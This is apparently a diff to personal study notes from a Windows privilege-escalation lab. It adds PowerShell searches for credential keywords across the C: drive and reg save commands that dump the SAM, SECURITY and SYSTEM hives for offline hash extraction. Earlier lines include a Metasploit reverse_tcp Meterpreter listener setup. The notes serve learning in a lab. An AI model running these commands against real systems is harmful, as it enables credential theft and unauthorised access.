@@ -137,3 +137,22 @@
   * When you find a service that you can reconfigure (using those `accesschk` or these PowerUp techniques), you can't just use a standard .exe. You have to use a file that speaks the "Service Control Manager" (SCM) language.
 * **Task 11** RDPing into the Desktop box using `xfreerdp` and mapping the drive: `xfreerdp /v:10.102.65.250 /u:user1 /dynamic-resolution +drives /drive:root,/home/kali`
 * **Task 14** To start a listener, `msfconsole` --> `use exploit/multi/handler` --> `set PAYLOAD windows/x64/meterpreter/reverse_tcp` --> `set LHOST 10.102.122.194` --> `set LPORT 4444` --> `run`. I was stupid and renamed my exploit from Temp at first, and it didn't work, and then I realized it's Temp because of `Temp Folder`. 
+
+### Uncommon Places
+* While PowerUp's automated checks search for cleartext passwords, it doesn't look everywhere. Keep in mind that people often leave credentials in files. Manually browsing every folder and reading each file is time-consuming, but PowerShell offers a handy alternative. For example, the following command recursively searches the whole C:\ drive for a specific keyword in the file name: `Get-ChildItem -Path "C:\" -Recurse -Filter "*keyword*" -ErrorAction SilentlyContinue -Force`. Alternatively, this command will recursively search for a keyword within all the files in the C:\ drive: `Get-ChildItem -Path "C:\" -Recurse -ErrorAction SilentlyContinue -Force | Select-String -Pattern "keyword`. Using these commands, you can search for keywords like `password, pass, username, user, credential, cred, secret, login`.
+
+#### SAM, SYSTEM, and SECURITY
+* The SAM (Security Account Manager) is a core Windows component that stores user account credentials in hashed formats. Its functionality relies on two other vital registry hives: SYSTEM and SECURITY. Together, they form a crucial trifecta in preservering system security and regulating access control.
+  * **SAM**: Stores user accounts and hashed passwords
+  * **SYSTEM**: Manages system configuration, including installed hardware and device drivers
+  * **SECURITY**: Handles user permissions and group relationships
+* These hives can't be accessed directly while the system is operational, requiring backups for offline analysis. Since Windows 2008 R2/Vista, reconstructing the SAM offline requires backups of all three hives. While the SECURITY and SYSTEM hives contian portions of the boot key cruical for decrypting the SAM's password hashes, the SAM hive houses the hashed passwords themselves.
+* These hives can be saved to file and backed up using `reg` command: `reg save HKLM\<HIVE> <backup file>`.
+
+##### Obtaining User Hashes
+* If an attacker gains access to a saved copy of SAM, SYSTEM, and SECURITY, it may be possible to obtain the user hashes for accounts on the host. For example, to save the hives, you'd need to run the following commands:
+```
+reg save HKLM\SAM SAM.bak
+reg save HKLM\SECURITY SECURITY.bak
+reg save HKLM\SYSTEM SYSTEM.bak
+```
